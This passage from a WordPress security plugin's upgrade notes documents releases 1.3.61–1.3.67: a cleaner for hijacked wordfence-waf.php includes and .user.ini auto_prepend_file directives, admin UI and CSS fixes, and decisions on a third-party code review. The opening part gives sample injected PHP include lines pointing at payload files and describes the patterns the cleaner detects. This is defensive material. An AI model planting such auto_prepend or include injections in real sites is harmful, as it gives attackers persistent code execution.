Refused patterns. If the offending include is on a line that contains other PHP statements and does not match either recognised form, the handler returns `mixed_line` status. Two examples: a single-line file like `<?php @include('/p.php'); @include_once(ABSPATH . 'wp-content/plugins/wordfence/waf/bootstrap.php'); ?>` (offending include on the same line as the canonical include  removing the line would also remove the canonical include); a wrapped-but-mismatched form `if (file_exists('/legit.php')) include('/payload.php');` (file_exists checks one path, include uses another  unusual pattern, may indicate either unfamiliar code or a hand-crafted variant requiring operator review). Both refusals produce a clean error pointing at manual edit. The handler never silently fails.

Recognised cleanable patterns for .user.ini. Single line: `auto_prepend_file = "<offending>"` or `auto_prepend_file = <offending>` (with or without quotes, case-insensitive directive name, surrounding whitespace tolerated). Whole-line removal because .user.ini is one-directive-per-line by design  no risk of clobbering adjacent code.

Safety mechanisms. Each Clean handler implements six layers of defence. (1) Hard-coded path. The handler accepts no path parameter from the client. `clean_wfwaf_include()` operates only on `ABSPATH . 'wordfence-waf.php'`; `clean_user_ini_prepend()` operates only on `ABSPATH . '.user.ini'`. This is materially narrower than the 1.3.57 residual-risk WPSEC-001 boundary on `wps_delete_file` (which accepts arbitrary paths inside ABSPATH under `manage_options` trust). (2) Backup-on-edit. The original file content is copied to `<file>.wps-backup-<unix-timestamp>` before any modification. Timestamp collisions are handled by appending a numeric suffix. The backup is not auto-deleted. (3) Atomic write. Cleaned content is written to `<file>.wps_tmp` and `rename()`d into the original path. If the write or rename fails, the original is untouched. (4) Pre-check. The offending content must actually be present; stale findings produce an "already clean" success without rewriting. (5) Mid-line guard. Conservative refusal of unrecognised mixed-content lines. (6) Post-write verification. After the rename, `clearstatcache()` runs and the file is re-read; the same regex used to detect the offending content originally is run against the re-read content. If still present, a critical error is logged and reported to the operator with the backup path.

Verification done. The cleaning logic was extracted into pure functions (`clean_wfwaf_compute()` and `clean_user_ini_compute()`) and tested in isolation against 27 input cases: typical wrapped form, bare include, idempotent re-run, brace-wrapped form, mismatched-paths refusal, freeform mid-line refusal, multi-include sequence, CRLF line endings, uppercase keywords, regex-metachar paths, already-clean file, .user.ini quoted form, .user.ini bare form, .user.ini idempotent, .user.ini uppercase directive, .user.ini empty file. All 27 passed.

The button rendering was tested through the static-render-then-parse pipeline introduced in the 1.3.65 process-gap fix. 8 input cases including paths with apostrophes, ampersands, and hidden-dot directories all produced well-formed onclick attributes that parsed back to the correct JS-engine argument list. 3 suppression cases (remediated, unknown strategy, missing strategy) correctly produced empty render output. This is the second release to apply the static-render verification step (1.3.66 was the first).

What 1.3.67 does NOT change. No new capabilities. Both new handlers run under `manage_options` trust, the same as `wps_delete_file`. No new nonces. No effect on the IoC catalogue. No detection changes. No effect on the 1.3.61 inline-delete-button, the 1.3.65 onclick fix, the 1.3.66 tab regrouping, or any prior remediation behaviour. The Forensics-tab buttons are independent and unaffected.

Acceptance criteria for 1.3.67:

1. Scanner findings for `wordfence-waf.php auto_prepend hijack: non-canonical include` carry `clean_strategy => 'wfwaf_hijack'`.
2. Scanner findings for `.user.ini sets auto_prepend_file to a non-canonical path` carry `clean_strategy => 'user_ini_prepend'`.
3. Scanner findings for `.htaccess sets auto_prepend_file to a non-canonical path` do NOT carry a `clean_strategy` field.
4. The Overview tab renders a "Clean injection" button alongside any qualifying finding card.
5. The button's onclick attribute round-trips through browser HTML-attribute extraction to a complete `wpsForensicAct(this,...)` call with three correctly-parsed JSON arguments.
6. `clean_wfwaf_compute()` returns `cleanable` for bare and wrapped patterns, `mixed_line` for refused patterns, `already_clean` for stale findings.
7. `clean_user_ini_compute()` returns `cleanable` for matching directive lines, `already_clean` otherwise.
8. The handlers create a backup file before writing and write atomically.
9. The handlers re-read the file after writing and verify the offending content is gone.
10. PHP parser fallback passes on all 20 PHP files.
11. `WPS_Indicators::INDICATOR_VERSION` is `1.3.67-1`.

## From 1.3.65 to 1.3.66+

Version 1.3.66 is a UX release answering three operator concerns raised in a single feedback round: the admin tabs were arbitrarily ordered, they did not look clickable, and the Diagnostics tab's "Latest signals" sub-section visually echoed the Events tab without distinct value.

Tab regrouping. The pre-1.3.66 tab order was Overview, Forensics, Diagnostics, Remediation, Hardening, Events, Settings. Diagnostics sat between two action tabs (Forensics and Remediation) for no functional reason; Events sat between Hardening (an action/config tab) and Settings (config) for no functional reason. The new order groups tabs by purpose: action band first (Overview, Forensics, Remediation, Hardening), then observability band (Diagnostics, Events), then configuration (Settings). The first tab of each band after the leading band gets a `wps-tab-group-start` CSS class via a new `$tab_group_starts` array in `class-admin.php`. The renderer reads that array from the rendering context and adds the class to qualifying tabs. `admin.css` turns the class into a 14px left margin and a 1px inset left edge using the existing `--wps-line` variable. The result is a subtle, visible boundary between bands without requiring a row break or extra vertical space.

Hover state. The pre-1.3.66 tab styling left non-active tabs as flat text on a white container with no hover affordance. Operators could not visually distinguish them from labels until the cursor changed. The fix uses a `:not(.nav-tab-active)` guard so the hover treatment applies only to non-active tabs and does not compete with the active state's gradient background. Hover and focus-visible properties: subtle background tint at `rgba(20, 32, 45, .055)`, text colour shifts from muted gray to primary ink, transitions at 150ms for smoothness. `cursor: pointer` is now explicit on the base tab rule.

Active tab accent. The pre-1.3.66 active state relied entirely on a slightly-different gradient background and an outer drop shadow. On light backgrounds it was readable but not strongly distinguished from a hovered tab. The new active state keeps the existing background and outer shadow and adds `inset 0 -2px 0 #14565d` to the box-shadow stack. The teal `#14565d` matches the version pill text colour and is the brand teal used elsewhere in the admin. Inset shadows do not clip with the rounded outer container the way `border-bottom` would. A combined `.nav-tab-active.wps-tab-group-start` selector handles the case where the active tab is also a band-start tab (Diagnostics-as-active or Settings-as-active); without it, the active rule's box-shadow would override the group-start rule's box-shadow because they target the same property. The combined selector layers all three shadow components.

Latest signals removal. The Diagnostics tab previously rendered four event-derived metrics in a 2-column grid card alongside "Security posture": last attack signal, last clearance, unique attacker IPs, current blocked IP attempts. Three of those four metrics were already covered elsewhere in the same tab  the cards row at the top showed event counts and hostile-IP block counts, the "Active hostile IP blocks" section showed unique attacker IPs in detail, the "Top attacking IPs" section showed attempt-by-IP counts. The fourth metric (last clearance timestamp) was the only genuinely-new datum and was low-value. The operator reported the card visually echoed the Events tab, which is the dedicated raw-event-log surface. The card is removed; the parent grid simplifies from `1fr 1fr` to a single full-width container so "Security posture" spans the whole row. The `$analytics` array is still computed because other Diagnostics sections (Recent activity by day, Top attacking IPs, Top attack subjects, Event mix) consume its sub-keys.

Verification step taken.

The 1.3.65 changelog committed to a new release-checklist step for admin-UI changes: render the affected component to a static HTML string, extract the relevant attribute or text, confirm it parses as intended. This release is the first to apply that step. A PHP test harness rendered the new tab nav for every possible `active_tab` value (overview, forensics, remediation, hardening, diagnostics, events, settings) and ran six assertions against the resulting markup:

1. Tab order matches expected sequence.
2. Diagnostics tab carries the `wps-tab-group-start` class.
3. Settings tab carries the `wps-tab-group-start` class.
4. Events tab does NOT carry the `wps-tab-group-start` class.
5. Overview tab does NOT carry the `wps-tab-group-start` class.
6. When Diagnostics is the active tab, the rendered tag carries both `nav-tab-active` and `wps-tab-group-start` classes.

All six passed before the build was packaged. The CSS cascade was also walked manually: each new selector's specificity calculated and confirmed against existing rules. The `:not(.nav-tab-active)` guard prevents the hover state from applying to the active tab. The combined `.nav-tab-active.wps-tab-group-start` selector beats both individual rules by class count and produces the expected merged shadow stack.

What 1.3.66 does NOT change.

No scanner changes. No new finding types. No IoC catalogue updates. No new AJAX handlers. No capability changes. No nonce model changes. The 1.3.57 audit's residual-risk acceptances stand. No effect on the Forensics-tab buttons or the 1.3.65 Overview-tab inline-delete fix, which use independent rendering paths. No effect on the 1.3.63/1.3.64 header pill design or the 1.3.64 tagline. The `$analytics` data structure passed into Diagnostics is unchanged.

Acceptance criteria for 1.3.66:

1. The `$tabs` array in `class-admin.php` produces the order: overview, forensics, remediation, hardening, diagnostics, events, settings.
2. The `$tab_group_starts` array contains exactly `[ 'diagnostics', 'settings' ]`.
3. The rendered tab nav HTML places `wps-tab-group-start` on the Diagnostics and Settings `<a>` elements only.
4. CSS hover state applies to non-active tabs and not to the active tab.
5. Active tab box-shadow stack includes the inset bottom accent at `#14565d`.
6. The "Latest signals" `<h3>` and its `<table>` no longer appear in the rendered Diagnostics HTML.
7. PHP parser fallback passes on all 20 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.66-1`.

## From 1.3.64 to 1.3.65+

Version 1.3.65 fixes the inline "Delete this path" button on Overview findings, which has not actually worked since it was added in 1.3.61.

What was broken. The 1.3.61 button rendering interpolated `wp_json_encode()` output directly into a double-quoted onclick attribute. JSON-encoded strings carry double-quote delimiters: `"\/wp-content\/plugins\/..."`. The resulting HTML had the shape:

```
onclick="wpsForensicAct(this, 'wps_delete_file', { path: "/wp-content/..." }, "...")"
```

Browsers read attribute values until the next un-escaped delimiter. The first inner double-quote after `path:` closed the onclick attribute. The browser saw the onclick as `wpsForensicAct(this, 'wps_delete_file', { path: ` and treated everything after as separate, malformed HTML. The click handler was never installed. Clicking the button produced no AJAX call, no error, no visual feedback  it was silently inert.

How it took four releases to catch. The 1.3.61 release-checklist verified version markers, PHP syntax, JS syntax, and ZIP integrity. It did not include a step to actually render the affected component and verify the resulting HTML parsed as intended. 1.3.62 (child-theme cleanup, log-path docs, JS escape hardening), 1.3.63 (header pill restyling), and 1.3.64 (CSS cascade fix for 1.3.63's regression) each touched other parts of the codebase but none re-verified the 1.3.61 button. An operator screenshot caught it: "Delete this path button doesn't work?"

This is the second consecutive case of a release shipping a feature that did not work as documented. The 1.3.63 → 1.3.64 sequence was the same shape: design intent recorded, feature shipped, regression caught after operator inspection, fix in the next release. Two consecutive instances of this pattern is not coincidence  it is the absence of an end-to-end verification step in the release-checklist.

What 1.3.65 fixes. The Overview button rendering at `includes/class-admin-overview.php` is rewritten to match the working pattern used by the Forensics-tab `forensic_action_button()` helper since 1.3.x. That helper has been quietly correct: build the onclick JS expression as a single PHP string, pass it through `esc_attr()` before placement into the rendered HTML. `esc_attr()` converts inner `"` to `&quot;`. The browser HTML-decodes `&quot;` back to `"` when populating the JS engine's argument list. The JS engine receives `wpsForensicAct(this, "wps_delete_file", {"path": "..."}, "...")` with all three arguments intact, the click handler installs correctly, and clicking the button triggers the AJAX call to the existing `wps_delete_file` handler.

End-to-end verification. A PHP test harness simulates the full pipeline: the PHP template renders to a static HTML string, the test extracts the onclick attribute by emulating browser HTML-attribute parsing, the test then walks the extracted JS expression as the JS engine would and confirms each argument round-trips to its intended value. 4/4 test paths pass: simple plugin folder, path with apostrophe, path with ampersand, and the actual `seo-by-rank-math/vendor/donatj/phpuseragentparser/.helpers` path from the operator screenshot.

Process gap and what changes. For releases that modify rendered admin UI from this point forward, the release-checklist adds three steps:

1. Render the affected component to a static HTML string in a PHP test harness that emulates the WordPress functions used by the template (`wp_json_encode`, `esc_attr`, `esc_html`, `sanitize_html_class`).
2. Extract the rendered attribute or text in question and confirm it parses as the intended structure  well-formed HTML attribute (delimiters balanced, no premature termination), well-formed JSON, syntactically-valid CSS rule.
3. For interactive elements (onclick, onsubmit, data attributes consumed by JS), confirm the JS-engine-visible argument list matches the intended values after the browser performs its HTML-decoding pass.

This is not exhaustive coverage. It will not catch every class of regression. Browser quirks, accessibility issues, dynamic state changes, race conditions, and visual layout problems are all outside its reach. But it would have caught both 1.3.61's onclick bug and 1.3.63's CSS specificity bug, and those are the two regressions that have actually shipped recently.

Acceptance criteria for 1.3.65:

1. The button rendering at `includes/class-admin-overview.php` builds the onclick JS expression as a single PHP string and passes it through `esc_attr()`.
2. Static-render simulation extracts a complete `wpsForensicAct(this,...)` expression after browser HTML-attribute parsing.
3. JS-engine argument parse confirms `action === 'wps_delete_file'`, `data.path === <original-path>`, and the confirmation message contains the path.
4. PHP parser fallback passes on all 20 PHP files.
5. No regression in the Forensics-tab buttons, which have been working since 1.3.x and use the same `esc_attr()` pattern.
6. `WPS_Indicators::INDICATOR_VERSION` is `1.3.65-1`.

## From 1.3.63 to 1.3.64+

Version 1.3.64 is a CSS-only release. Two changes: a specificity-cascade fix that allows the 1.3.63 severity-aware issue-alert design to actually render, and a tagline update from "Focused malware defense." to "Forensic WordPress malware defence."

The cascade bug. The 1.3.63 release converted the header pills from inline-styled `<span>` elements to class-based markup (`wps-version-pill`, `wps-issue-alert`, `wps-issue-dot`, plus a `wps-sev-{critical|high|medium|low}` modifier) and added a block of new rules at the bottom of `assets/css/admin.css` to give the issue alert a severity-aware coloured pill. That release shipped without anyone walking the cascade end-to-end. The existing rule at line 50 of the stylesheet, `.wps-app > h1 span { ... }`, continued to match both header pills because both are `<span>` children of the `<h1>`. That rule used `!important` on `background`, `color`, `font-size`, `font-weight`, and `padding`. The 1.3.63 issue-alert rules at the bottom of the file did not use `!important`, so even though their selector specificity was technically higher (`.wps-issue-alert.wps-sev-critical` is `0,2,0` vs `.wps-app > h1 span` at `0,1,2`), the existing rule's `!important` declarations won for the colour-and-size properties that drove the visible appearance. The issue alert continued to render as a white-gradient pill with teal text, identical to the version pill, identical to the pre-1.3.63 appearance. The 1.3.63 build deployed the same visible header as 1.3.62, even though the changelog claimed otherwise.

How the bug was caught. An operator screenshot review prompted by an unrelated tagline question (the operator asked "cant you find a better tagline than 'Focused malware defense'?") led to inspecting the surrounding CSS context. The dead attribute selector `.wps-app > h1 span[style*="background:#c00"]` at lines 73-75 of the stylesheet  a hack that had been overriding the OLD inline `background:#c00` red with translucent pink to produce the lavender appearance visible in pre-1.3.63 screenshots  was the entry point. Walking from there to the broad span rule at line 50 surfaced the specificity issue. Without the tagline question, the cascade bug would have remained shipped indefinitely.

What 1.3.64 fixes.

The selector at line 50 changes from `.wps-app > h1 span` to `.wps-app > h1 .wps-version-pill`. The version pill keeps its existing white-gradient teal-text appearance, which was working and which was not what the operator was complaining about. The issue alert is no longer captured by that rule, so the 1.3.63 `.wps-issue-alert` and `.wps-sev-*` rules at the bottom of the file drive its visual without competition. The severity-aware red/orange/amber/blue colouring documented in the 1.3.63 changelog is now what actually renders. A site with a critical finding will see a red alert pill; a site with only medium findings will see amber; a site with only low findings will see blue.

The dead attribute selector at lines 73-75 of pre-1.3.64 admin.css is removed. The 1.3.63 markup conversion eliminated all inline `style=""` attributes on header pills, so the attribute selector could no longer match anything. It was inert clutter in the cascade and removing it has no functional effect.

The redundant `.wps-version-pill` rule at the bottom of admin.css that was added in 1.3.63 is also removed. That rule attempted a different (gray-rectangle) treatment for the version pill, but the version pill's existing white-gradient pill styling was already correct, and the operator's reported visual concern was about the issue pill specifically. Two rules competing for the version pill would have created confusion. The rescoped rule from line 50 (now `.wps-app > h1 .wps-version-pill`) is the single source of truth for version-pill styling.

The tagline change.

"Focused malware defense." had three problems. "Focused" is a generic positive adjective that does no specific work. "malware defense" is generic and indistinguishable from every other security plugin's marketing copy. The American spelling ("defense") was inconsistent with the British-spelling editorial register the rest of the project documentation uses. The replacement, "Forensic WordPress malware defence.", specifies WordPress as the threat surface, signals depth of analysis (drop-in audits, persistence detection, structural shape heuristics, captured-sample IoC catalogue) via "Forensic", and matches the documentation register's British spelling. The new tagline is 35 characters, fitting within the existing `max-width: 240px` constraint at `font-size: 13px`.

What 1.3.64 does NOT change.

No PHP changes. The header markup in `class-admin.php` was already correct as of 1.3.63; the bug was in the CSS cascade only. No scanner changes, no new finding types, no IoC catalogue updates. No AJAX handler changes, no capability changes, no nonce model changes. The 1.3.57 audit's residual-risk acceptances stand. No effect on the 1.3.61 inline "Delete this path" button on Overview findings, the 1.3.62 `clean_functions()` parent+child theme walking, or any prior remediation behaviour.

Audit history note.

The 1.3.63 changelog and SSOT entries are left intact rather than retroactively edited. They represent the INTENT of the header redesign  the design that was supposed to ship at that version. The 1.3.64 entries represent the actual delivery. An auditor reviewing the project trail can see the sequence: design intent recorded in 1.3.63, cascade-bug discovery between 1.3.63 and 1.3.64, fix recorded in 1.3.64. This kind of two-release "intent then delivery" pattern is the correct way to handle a buggy release once the build has shipped, because retroactively editing the 1.3.63 docs to claim the intent was the delivery would erase the audit history of the bug.

Acceptance criteria for 1.3.64:

1. `assets/css/admin.css` line 41 reads `content: "Forensic WordPress malware defence.";`
2. `assets/css/admin.css` line 50 (or thereabouts after structure changes) uses selector `.wps-app > h1 .wps-version-pill` rather than `.wps-app > h1 span`.
3. The dead attribute selector `.wps-app > h1 span[style*="background:#c00"]` is no longer present in the stylesheet.
4. The redundant `.wps-version-pill` rule at the bottom of the stylesheet is no longer present.
5. The mobile-breakpoint rule at line 689 (or thereabouts) `.wps-app > h1 span { display: inline-flex; margin-top: 12px; }` is unchanged because the desired behaviour on narrow viewports is for both pills to wrap together below the title.
6. PHP parser fallback passes on all 20 PHP files.
7. `WPS_Indicators::INDICATOR_VERSION` is `1.3.64-1`.

## From 1.3.62 to 1.3.63+

Version 1.3.63 is a UI polish release covering one issue: the admin header pills.

The motivation. Across versions 1.3.x the admin header rendered the plugin version (`v1.3.x`) and the issue-count alert (`1 issue` / `5 issues`) as two `<span>` elements with inline styles, sitting on the same line as the "WP Perf Shield" title. Both spans used pill-shaped backgrounds with similar `border-radius` values and near-identical `padding` and `font-size`, so visually the two pills looked like equal-weight metadata blobs. The version pill is informational metadata; the issue-count alert is actionable. Treating them as visual equivalents was wrong information design. A site operator viewing a screenshot of the header could not tell at a glance whether a site had findings present or not.

The colour problem made it worse. The issue-count alert used `background:#c00`. On the right portion of the gradient header (which transitions through magenta/pink hues), the red rendered as muted lavender after JPEG compression on operator screenshots. The alert appeared decorative rather than urgent.

The 1.3.63 redesign keeps both pills in their original position because the right side of the gradient header has the "Focused malware defense." tagline and moving the alert there would create a layout collision. Inside the original position the redesign differentiates the two pills visually:

The version pill becomes a smaller rounded-corner rectangle in muted gray. Text colour shifts from `#666` to `#555` for slightly improved contrast against the `#f0f0f0` background. The border-radius is reduced from the original pill-style `4px` to a flat `4px` (functionally similar but with `padding: 3px 9px` it now reads as a square-corner rectangle rather than a pill). This visual treatment matches the operator's expectation that the version is metadata, not a call to action.

The issue alert becomes a fully rounded pill with severity-aware colour. The alert background is now driven by the highest severity present in the cached findings array: critical findings produce `#dc2626` (red), high produces `#ea580c` (orange), medium produces `#ca8a04` (amber), low produces `#2563eb` (blue). The colour palette stays inside the conventional security-UX vocabulary. The pill gets larger padding (`4px 12px 4px 10px`), bolder text (`font-weight: 600`), and a `box-shadow: 0 1px 3px rgba(0,0,0,0.18)` for depth on the gradient. A small pulsing dot inside the pill (`7px` diameter, white with semi-transparent ring) draws the eye without becoming irritating; the pulse animation is `2.4s ease-in-out infinite` and respects `prefers-reduced-motion: reduce` for operators who request reduced motion at the OS or browser level. The dot is `aria-hidden="true"` because it duplicates the count text for screen readers.

What 1.3.63 does NOT change.

No detection changes. No new finding types, no IoC catalogue updates, no scanner walker changes, no per-prefix or per-hash blocklist additions, no shape-heuristic adjustments. The IoC catalogue is byte-identical to 1.3.62.

No AJAX handlers added or modified. No capability changes. No nonce model changes. The 1.3.57 audit's residual-risk acceptance for `wps_delete_file` (ABSPATH-wide trust under `manage_options`) stands. The 1.3.61 inline "Delete this path" button on Overview findings continues to operate exactly as before  the per-finding-card markup is independent of the header pill change.

No operator workflow changes. The version pill still shows the plugin version, the issue alert still shows the cached findings count, and clicking either does nothing in 1.3.63 (same as prior behaviour). Making the alert clickable to deep-link into the Overview tab's findings list is potential future work but is out of scope here. The motivation for that future change would be to give operators a single click from "I see there are issues" to "show me the details", which is good UX, but adding a click target carries its own design considerations (focus state, keyboard activation, screen-reader role) that warrant a separate release.

Acceptance criteria for 1.3.63:

1. Header `<h1>` markup uses class-based pill spans (`wps-app-title`, `wps-version-pill`, `wps-issue-alert`, `wps-issue-dot`) rather than inline styles.
2. The issue alert receives a `wps-sev-<severity>` modifier class corresponding to the highest severity present in the cached findings array.
3. The findings array's highest-severity computation falls back to medium-amber when no findings carry a severity field.
4. The pulsing dot animation is suppressed when `prefers-reduced-motion: reduce` is set.
5. The decorative dot is `aria-hidden="true"`.
6. CSS class names referenced in PHP all have corresponding rules in `assets/css/admin.css`.
7. PHP parser fallback passes on all 20 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.63-1`.

## From 1.3.61 to 1.3.62+

Version 1.3.62 is a selective uptake of findings from a third-party static code review of 1.3.59. The review proposed nine changes total (seven hardening recommendations plus two documentation corrections); this release acts on the four that were genuinely valid and explicitly defers the remaining three that either contradicted prior 1.3.57 audit decisions or were already mitigated by the 1.3.57 WPSEC-006 stub guard. Selective uptake protects the integrity of the 1.3.57 audit history while addressing the actual gaps the third-party review identified.

The four changes shipped.

The first change repairs a legitimate bug in the credential-harvester cleanup flow. Until 1.3.62, the `clean_functions()` AJAX handler inspected only `get_template_directory() . '/functions.php'`. On a site running a child theme, that path resolves to the parent theme's `functions.php`. The wp-locale-handler RAT v1.7 family's credential harvester injects code into whichever `functions.php` is active when the malicious payload runs, so on child-theme sites the injection persisted in the child theme's `functions.php` and the cleanup quietly missed it. The fix takes the union of `get_template_directory()` and `get_stylesheet_directory()`, removes any duplicate (when no child theme is active both functions return the same path), reads each file independently, applies the same injection-removal regex to both, and reports per-file outcomes. The result message lists every file's status separately so the operator can verify the cleanup landed on both surfaces if both were infected.

The second change corrects a documentation/code mismatch that could have wasted operator time during incident response. The plugin's WordPress readme said security events were stored in `wp-content/uploads/wps-logs/events.php`. The actual `WPS_LOG_DIR` constant defined at line 20 of `wp-perf-shield.php` resolves to `wp-content/plugins/wp-perf-shield/logs`, and the `WPS_LOG_FILE` constant at line 21 resolves to that directory's `events.php`. An operator following the readme to inspect logs after a suspected incident would find an empty uploads directory and conclude that logging was broken or that the malware had wiped the logs, when the logs were actually present at a different path. The 1.3.62 readme matches the code; no functional change.

The third change hardens admin JavaScript message rendering against a narrow but real defence-in-depth concern. Several remediation handlers compose `r.data.message` from user-influenced data: `delete_attachment()` includes the WordPress attachment title, `delete_user()` includes the login string, `delete_single_option()` and `delete_unknown_b64()` include the option name, `delete_file()` and `delete_plugin_folder()` include the file basename. All these were interpolated into HTML via `.html()` and string concatenation in the previous JavaScript. The practical exploitation reach was narrow (the attacker would need to either be an admin already, or have written attacker-controlled values into a database column that an admin would later see in remediation output), but the pattern was fragile. The 1.3.62 fix wraps `r.data.message` and `r.data.error` in `esc()` at the four call sites that previously passed them raw (lines 175, 190, 205, 222, 233, 251, 259 of `assets/js/admin.js`), replaces the `d.deleted.join('</code>, <code>')` pattern with a per-item map that wraps each option name in `esc()` (line 254), and converts the per-finding success replacement from string concatenation to jQuery's element constructor with the `text:` field (line 349). The `msg()` and `remMsg()` helper functions themselves remain `.html()`-based because legitimate callers compose detail messages with intentional `<a>` / `<br>` / `<code>` / `<strong>` markup; switching the helpers to `.text()` would render that markup as literal text and break the UI. The escape-at-call-site approach matches the existing `esc(f.file)` / `esc(item.label)` style already in use elsewhere in the same file.

The fourth change is a selective terminology correction. The 1.3.56 rename retired "operator-target site" in favour of "victim site" because the original term was structurally ambiguous: it could be read as "target FOR the operator" (correct, the victim) or "target OWNED BY the operator" (incorrect, attacker infrastructure). The natural reading was the second one, which inverted the actual semantics. Several 1.3.59 entries reintroduced the deprecated term in new content. The 1.3.62 documentation correction fixes those slip-backs (one in `readme.txt`, one in `doc/changelog.md`, one in `doc/ssot.md`, two in `doc/upgrading.md`) while deliberately leaving three categories of references unchanged: historical text in the 1.3.55 and 1.3.56 changelog entries that describe the original terminology and the rename itself (rewriting these would erase the audit history of the rename); references to the deprecated function name `WPS_Indicators::known_rat_operator_targets()` (the alias still exists in code, and renaming the documentation references would create a code-vs-docs mismatch); pre-1.3.56 release entries (those describe the codebase as it was at that release).

The three changes NOT shipped, with explicit reasons.

The third-party review recommended adding a path-specific nonce hash to `delete_file()` so that deletion authority is bound to the specific path the scanner found rather than to ABSPATH-wide trust under `manage_options`. The 1.3.57 formal audit explicitly considered this trade-off and accepted the residual risk: the existing nonce + capability + ABSPATH containment + WPSEC-003 protected-basename list controls were judged sufficient, and per-path nonces would create race conditions between fresh scans and click actions that would break legitimate operator workflows where the operator clicks delete some time after a scan. Reopening this decision warrants its own audit cycle, not a third-party review's recommendation in a separate context.

The third-party review recommended adding an explicit `delete_scope` field to every finding and validating that the target path matches the declared scope before auto-remediation. The architectural point is reasonable as a defence-in-depth layer, but the scope is already implicit in the existing code: only specific scanner checks set `auto_delete=true`, and each such check produces findings only inside the directory class it knows is appropriate (e.g., `check_uploads_for_php()` only sets `auto_delete=true` on findings inside `wp_upload_dir()`). Adding explicit `delete_scope` plumbing across every finding-producing check is a meaningful refactor with non-trivial test surface, not a third-party-review-driven point fix. Deferred for deliberate consideration in a future audit cycle.

The third-party review recommended removing `tools/update-indicators.php` from the release ZIP entirely. The 1.3.57 audit's WPSEC-006 finding identified the same concerns (incomplete WordPress bootstrap, unsafe regex-based PHP source rewriting, absent feed trust model) and chose to keep the file as a clearly-labelled stub with an explicit `example.com` execution guard at line 31. The dangerous code paths are unreachable until someone replaces the placeholder URL. The reviewer's "remove from release ZIP" recommendation is more aggressive than 1.3.57's accepted position; acting on it now would silently overturn a documented audit decision.

Acceptance criteria for 1.3.62:

1. `WPS_Remediation_Controller::clean_functions()` walks both `get_template_directory()` and `get_stylesheet_directory()` for `functions.php`, de-duplicates, and reports per-file outcomes.
2. `readme.txt` log-location text matches the actual `WPS_LOG_DIR` / `WPS_LOG_FILE` constant resolution.
3. `assets/js/admin.js` no longer interpolates raw `r.data.message`, raw `r.data.error`, or raw `d.deleted` items into HTML at any call site.
4. The four "operator-target" slip-backs in 1.3.59 entries are corrected to "victim site"; historical and code-symbol references remain.
5. PHP parser fallback passes on all 20 PHP files.
6. JavaScript syntax check (`node --check`) passes.
7. `WPS_Indicators::INDICATOR_VERSION` is `1.3.62-1`.

## From 1.3.60 to 1.3.61+

Version 1.3.61 closes a real UX gap on the Overview tab: findings that the scanner has confirmed are deletable get a one-click "Delete this path" button instead of instruction-only text.

The motivation. From 1.3.51 through 1.3.60 the scanner produced findings of the shape `Hidden development directory under wp-content/` (severity `medium`, e.g., `.vscode/`, `.git/`, `.idea/`, `.cache/` left in a plugin folder by a developer) and `Hidden directory under wp-content/ (no benign explanation)` (severity `high`, e.g., `.helpers/`, `.foo/` leading-dot directories with no developer-tool meaning). Both finding types are common, both are typically inside `wp-content/plugins/<some-plugin>/`, and both are safe to delete in the overwhelming majority of cases. The Forensics tab already had row-level "Delete" buttons for similar artefacts. The Overview tab did not. An operator looking at five findings on the Overview tab had to either drill into the Forensics tab (where the action buttons existed) or open SSH and delete each path manually. The friction was real.

What 1.3.61 changes. The scanner's hidden-directory walker (`WPS_Scanner::check_dropper_cache()`) now populates a `delete_path` field on the two finding types described above when the candidate path is contained within `WP_PLUGIN_DIR`. The boundary check is performed after `realpath` resolution on both the candidate path and the plugin directory, defeating any symlink-traversal trick that would otherwise let a path appear to be inside the boundary while pointing at something outside. The Overview UI (`includes/class-admin-overview.php`) renders an inline "Delete this path" button when `delete_path` is set and the finding is neither already remediated nor explicitly skipped. The button is wired to the existing `wps_delete_file` AJAX handler via the existing `wpsForensicAct` JS helper. No new AJAX handler. No new capability. No new path acceptance. The UI just exposes capability that already existed.

Why the boundary matters. The 1.3.57 audit's WPSEC-001 finding narrowed `delete_plugin_folder`'s containment from `WP_CONTENT_DIR` to `WP_PLUGIN_DIR` to prevent a privilege-escalation path if a low-privilege role ever gained access to the AJAX handler. The 1.3.61 button-rendering logic respects that same narrowing. A finding inside `wp-content/plugins/<some-plugin>/.vscode/` gets a button. A finding inside `wp-content/themes/<some-theme>/.idea/` does not. A finding at ABSPATH root (e.g., `.maintenance`, `.wp-config-cache.php`) does not. An operator who wants to delete those paths still can, but must use the residual-risk path: SSH, the Forensics tab's existing per-row buttons, or the dedicated remediation handler for that specific finding type. The Overview button is for the safe-boundary-confirmed cases only.

What 1.3.61 does NOT change.

The `wps_delete_file` AJAX handler is reused exactly as it was in 1.3.60. All its safety constraints stay in place: `manage_options` capability check, nonce verification, `path_is_inside( ABSPATH )` containment check, the WPSEC-003 (1.3.57) protected-basename list for `.htaccess`, `.user.ini`, `wp-cron.php`, `wp-trackback.php`, and `wp-comments-post.php` at ABSPATH root. The 1.3.57 audit's residual-risk acceptance for this handler (ABSPATH-wide trust under `manage_options`) is unchanged. The 1.3.61 `delete_path` field on findings is a UI gating mechanism, not a security boundary; if both nonce and capability checks were bypassed, the AJAX handler itself remains the authoritative defence.

The button is suppressed for findings whose `remediated` or `auto_delete_skipped` flag is set, because the operator has already been given the choice once. Re-rendering the button after the operator chose to skip would feel pushy and risk accidental deletion of an artefact the operator deliberately chose to retain.

The `wordfence-waf.php auto_prepend hijack: non-canonical include` finding type and similar surgical-edit cases are explicitly out of scope for 1.3.61. Those findings need one specific line removed from a legitimate file (the `include` directive pointing at a `.sbs` toolkit payload), not deletion of the whole file. Implementing that safely requires a backup-on-edit mechanism, careful pattern matching to avoid removing legitimate `include` directives placed by other software, and a rollback path if the edited file becomes invalid. Targeted for 1.3.62 pending operator review of the 1.3.61 inline-delete behaviour.

Acceptance criteria for 1.3.61:

1. `WPS_Scanner::check_dropper_cache()` populates `delete_path` on `Hidden development directory under wp-content/` findings when the candidate path is inside `WP_PLUGIN_DIR`.
2. The same function populates `delete_path` on `Hidden directory under wp-content/ (no benign explanation)` findings when the candidate path is inside `WP_PLUGIN_DIR`.
3. Findings outside `WP_PLUGIN_DIR` (e.g., in `wp-content/themes/`) do not have `delete_path` populated.
4. `includes/class-admin-overview.php` renders an inline "Delete this path" button when `delete_path` is set, the finding is not already `remediated`, and `auto_delete_skipped` is not set.
5. The button calls `wps_delete_file` AJAX handler with the operator-confirmed path.
6. JS `wpsForensicAct` row-selector recognises the new finding-card markup so the success-state animation works.
7. CSS `.wps-finding-delete-btn` styles render the button as a small destructive-style affordance with hover state.
